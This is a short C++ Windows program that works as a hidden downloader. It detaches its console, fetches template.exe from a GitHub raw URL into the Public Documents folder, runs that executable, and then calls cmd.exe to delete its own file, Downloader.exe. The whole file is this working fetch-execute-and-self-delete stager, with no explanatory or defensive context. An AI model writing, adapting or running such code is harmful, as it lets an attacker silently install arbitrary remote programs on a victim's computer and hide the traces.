#include <Windows.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")
int main()
{
	FreeConsole();
	LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("https://raw.githubusercontent.com/tconqueror/template/master/template.exe"));
	LPWSTR cmtPath = const_cast<LPWSTR>(TEXT("C:\\Users\\Public\\Documents\\template.exe"));
	DWORD retCode = 0;
	if (URLDownloadToFile(NULL, cmtArg, cmtPath, 0, NULL) != S_OK)
	{
		return 0;
	}
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPCWSTR path = L"C:\\Users\\Public\\Documents\\template.exe";
	//LPWSTR arg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe \c C:\\Users\\Public\\Documents\\template.exe"));
	if (CreateProcess(cmtPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	path = L"C:\\Windows\\System32\\cmd.exe";
	LPWSTR cmtArg1 = const_cast<LPWSTR>(TEXT("/c del /f Downloader.exe"));
	if (CreateProcess(path, cmtArg1, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	return 0;
}